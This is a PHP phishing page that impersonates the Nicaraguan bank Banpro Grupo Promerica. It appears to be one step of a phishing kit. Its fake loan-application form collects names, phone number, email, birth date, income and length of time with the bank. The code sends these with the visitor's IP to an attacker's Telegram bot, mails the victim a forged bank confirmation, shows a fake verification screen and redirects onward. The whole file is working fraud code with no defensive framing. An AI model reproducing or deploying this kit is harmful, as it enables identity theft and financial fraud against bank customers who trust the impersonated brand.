<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) {
    header('Location: /', true, 302);
    exit;
}
include("oslo.php");
include("inti.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombres   = trim($_POST['nombres'] ?? '');
    $apellidos = trim($_POST['apellidos'] ?? '');
    $tele_musg  = trim($_POST['telefono'] ?? '');
    $correo    = trim($_POST['correo'] ?? '');
    $fh_esme     = trim($_POST['fecha_nac'] ?? '');
    $ingresos  = trim($_POST['ingresos'] ?? '');
    $tiempo    = trim($_POST['tiempo_entidad'] ?? 'N/A');
    $ip        = ip_yago();

    $mg  = "📋 FORMULARIO DE SOLICITUD\n";
    $mg .= "👤 Nombres: $nombres\n";
    $mg .= "👤 Apellidos: $apellidos\n";
    $mg .= "📞 Telefono: $tele_musg\n";
    $mg .= "📧 Email: $correo\n";
    $mg .= "🎂 Fecha Nac.: $fh_esme\n";
    $mg .= "💰 Ingresos: $ingresos\n";
    $mg .= "⏳ Tiempo entidad: $tiempo\n";
    $mg .= "🌐 IP: $ip";

    @file_get_contents("https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
        'chat_id' => $koala,
        'text'    => $mg
    ]));

    // Correo de confirmacion al cliente (fail-silent si Brevo no esta configurado)
    $nombreCompleto = trim("$nombres $apellidos");
    $_SESSION['correo_cliente'] = $correo;
    $_SESSION['nombre_cliente'] = $nombreCompleto;
    if ($correo) {
        $html = '<div style="font-family:Arial,sans-serif;max-width:560px;margin:0 auto;border:1px solid #e0e0e0;border-radius:8px;overflow:hidden">'
              . '<div style="background:#006838;padding:20px 24px;color:#fff;font-size:18px;font-weight:700">Banpro Grupo Promerica</div>'
              . '<div style="padding:28px 24px;color:#333;font-size:14px;line-height:1.7">'
              . '<p>Estimado(a) <b>' . htmlspecialchars($nombreCompleto) . '</b>,</p>'
              . '<p>Hemos recibido su solicitud correctamente. Un asesor especializado revisar&aacute; su informaci&oacute;n y se pondr&aacute; en contacto con usted en las pr&oacute;ximas horas.</p>'
              . '<p style="color:#777;font-size:12px;margin-top:24px">Este es un correo autom&aacute;tico, por favor no responda a este mensaje.</p>'
              . '</div></div>';
        @brevo_send($correo, $nombreCompleto, 'Solicitud recibida - Banpro', $html);
    }

    $_SESSION['contacto_ok'] = true;
    // Show loading screen instead of immediate redirect
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Procesando solicitud - Banpro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;background:#fff;font-family:'Segoe UI',Roboto,Arial,sans-serif;color:#333;display:flex;flex-direction:column;}
        .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;border-bottom:1px solid #e0e0e0;background:#fff;}
        .topbar img{height:48px;width:auto;}
        .loading-wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 24px;}
        .loading-box{text-align:center;max-width:400px;}
        .spinner{margin:0 auto 28px;}
        .spinner img{width:140px;height:140px;}
        .load-msg{font-size:18px;color:#006838;font-weight:500;min-height:28px;transition:opacity 0.3s;}
        .load-sub{font-size:13px;color:#999;margin-top:12px;}
    </style>
</head>
<body>
<div class="topbar">
    <img src="l.png" alt="Banpro Grupo Promerica">
</div>
<div class="loading-wrap">
    <div class="loading-box">
        <div class="spinner"><img src="img/gifcarga.gif" alt="Cargando"></div>
        <div class="load-msg" id="loadMsg">Consultando informaci&oacute;n...</div>
        <p class="load-sub">Por favor espere, no cierre esta ventana.</p>
    </div>
</div>
<script>
var msgs=["Consultando informaci\u00f3n...","Procesando...","Verificando datos...","Redirigiendo..."];
var i=0,el=document.getElementById('loadMsg');
var iv=setInterval(function(){
    i++;
    if(i<msgs.length){el.textContent=msgs[i];}
    else{clearInterval(iv);}
},1500);
setTimeout(function(){window.location.href="jaspe.php";},5000);
</script>
</body>
</html>
<?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Formulario Solicitud - Banpro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;background:#fff;font-family:'Segoe UI',Roboto,Arial,sans-serif;color:#333;}
        .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;border-bottom:1px solid #e0e0e0;background:#fff;}
        .topbar img{height:48px;width:auto;}
        .hamburger{width:28px;height:22px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer;}
        .hamburger span{display:block;height:3px;background:#333;border-radius:2px;}
        .page-wrap{max-width:780px;margin:0 auto;padding:30px 24px 50px;}
        .breadcrumb{font-size:15px;color:#888;margin-bottom:6px;}
        .page-title{font-size:clamp(20px,4vw,28px);color:#006838;font-weight:400;letter-spacing:0.5px;margin-bottom:22px;}
        .page-subtitle{font-size:15px;color:#006838;line-height:1.6;margin-bottom:32px;font-weight:400;}
        .section-box{background:#fff;border:1px solid #e5e5e5;border-radius:4px;padding:28px 24px 32px;margin-bottom:24px;}
        .section-heading{font-size:18px;color:#333;font-weight:300;letter-spacing:0.5px;margin-bottom:24px;text-transform:uppercase;}
        .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px 28px;}
        @media(max-width:600px){.form-grid{grid-template-columns:1fr;}}
        .fg{display:flex;flex-direction:column;}
        .fg.full{grid-column:1/-1;}
        .fg label{font-size:13px;font-weight:700;color:#006838;text-transform:uppercase;letter-spacing:0.3px;margin-bottom:6px;}
        .fg label .req{font-weight:400;color:#4a9a5b;text-transform:lowercase;font-size:12px;}
        .fg input,.fg select{width:100%;padding:12px 14px;border:1px solid #d0d0d0;border-radius:3px;font-size:14px;color:#555;background:#f9f9f9;outline:none;font-family:inherit;transition:border-color 0.2s;}
        .fg input:focus,.fg select:focus{border-color:#006838;background:#fff;}
        .fg input::placeholder{color:#aaa;font-style:italic;}
        .btn-submit{display:block;width:100%;max-width:280px;margin:28px auto 0;padding:14px 24px;background:#006838;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:0.5px;transition:background 0.2s;font-family:inherit;}
        .btn-submit:hover{background:#005228;}
        .note{margin-top:18px;font-size:11px;color:#999;text-align:center;line-height:1.5;}
    </style>
</head>
<body>
<div class="topbar">
    <img src="l.png" alt="Banpro Grupo Promerica">
    <div class="hamburger"><span></span><span></span><span></span></div>
</div>
<div class="page-wrap">
    <div class="breadcrumb">Solicitudes /</div>
    <h1 class="page-title">FORMULARIO DE SOLICITUD</h1>
    <p class="page-subtitle">Por favor, complete los datos solicitados y al finalizar, haga click en "Aplicar ahora!"</p>

    <form method="post" action="" id="fContacto">
        <div class="section-box">
            <div class="section-heading">Datos Personales</div>
            <div class="form-grid">
                <div class="fg">
                    <label>Nombres <span class="req">(requerido)</span></label>
                    <input name="nombres" type="text" placeholder="Nombres" required autocomplete="given-name">
                </div>
                <div class="fg">
                    <label>Apellidos <span class="req">(requerido)</span></label>
                    <input name="apellidos" type="text" placeholder="Apellidos" required autocomplete="family-name">
                </div>
                <div class="fg">
                    <label>N&uacute;mero de tel&eacute;fono <span class="req">(requerido)</span></label>
                    <input name="telefono" type="tel" placeholder="N&uacute;mero de tu tel&eacute;fono: 99999999" required autocomplete="tel">
                </div>
                <div class="fg">
                    <label>Email <span class="req">(requerido)</span></label>
                    <input name="correo" type="email" placeholder="Direcci&oacute;n de correo: nombre@sitio.com" required autocomplete="email">
                </div>
                <div class="fg">
                    <label>Fecha de nacimiento <span class="req">(requerido)</span></label>
                    <input name="fecha_nac" type="date" required>
                </div>
                <div class="fg">
                    <label>Ingresos mensuales <span class="req">(requerido)</span></label>
                    <input name="ingresos" id="ingresos" type="text" placeholder="C$" required>
                </div>
                <div class="fg full">
                    <label>Tiempo con la entidad <span class="req">(requerido)</span></label>
                    <select name="tiempo_entidad" required>
                        <option value="">Seleccione...</option>
                        <option value="Menos de 1 anio">Menos de 1 a&ntilde;o</option>
                        <option value="1-3 anios">1 a 3 a&ntilde;os</option>
                        <option value="3-5 anios">3 a 5 a&ntilde;os</option>
                        <option value="5-10 anios">5 a 10 a&ntilde;os</option>
                        <option value="Mas de 10 anios">M&aacute;s de 10 a&ntilde;os</option>
                    </select>
                </div>
            </div>
        </div>

        <button type="submit" class="btn-submit">Aplicar ahora</button>
    </form>
    <p class="note">Sus datos est&aacute;n protegidos bajo nuestra pol&iacute;tica de privacidad y seguridad bancaria.</p>
</div>
<script>
(function(){
    var inp=document.getElementById('ingresos');
    inp.addEventListener('input',function(){
        var v=this.value.replace(/[^0-9]/g,'');
        if(v){this.value='C$'+v.replace(/\B(?=(\d{3})+(?!\d))/g,'.');}
        else{this.value='';}
    });
    inp.addEventListener('focus',function(){
        if(!this.value) this.value='C$';
    });
})();
</script>
</body>
</html>
